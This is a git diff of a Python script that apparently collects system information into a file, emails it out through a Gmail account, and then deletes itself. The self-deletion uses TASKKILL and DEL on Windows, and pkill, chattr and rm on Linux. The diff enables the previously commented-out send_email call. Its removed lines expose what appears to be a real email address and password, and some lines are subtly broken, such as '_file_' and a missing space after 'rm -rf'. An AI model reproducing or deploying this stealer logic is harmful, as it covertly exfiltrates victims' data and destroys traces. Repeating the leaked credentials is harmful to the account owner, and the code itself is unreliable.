@@ -8,8 +8,8 @@ from email.mime.text import MIMEText
 import glob
 
 system_information = "Informations.txt"
-email_address = "bospostadenemesi@gmail.com"
-password = "112358yunus"
+email_address = "YOUR MAIL"
+password = "YOUR PASSWORD"
 file_path = os.getcwd()
 
 
@@ -82,6 +82,14 @@ if os.name == "nt":
                             f.close()
             except:
                 pass
+    try:
+        pwd = os.path.abspath(os.getcwd())
+        os.system("cd " + pwd)
+        os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+        print('File was closed.')
+        os.system("DEL " + os.path.basename(__file__))
+    except OSError:
+        print('File is close.')
 else:
     os.system("chmod +x " + os.path.basename(_file_))
     try:
@@ -96,9 +104,18 @@ else:
                 f.close()
     except:
         pass
+    try:
+        pwd = os.path.abspath(os.getcwd())
+        os.system("cd " + pwd)
+        os.system('pkill leafpad')
+        os.system("chattr -i " + os.path.basename(__file__))
+        print('File was closed.')
+        os.system("rm -rf" + os.path.basename(__file__))
+    except OSError:
+        print('File is close.')
     os.system("./" + os.path.basename(_file_))
-# send_email(system_information, file_path + "\\" + system_information)
-# os.remove("Informations.txt")
+send_email(system_information, file_path + "\\" + system_information)
+os.remove("Informations.txt")
 
 ''''''''''
 
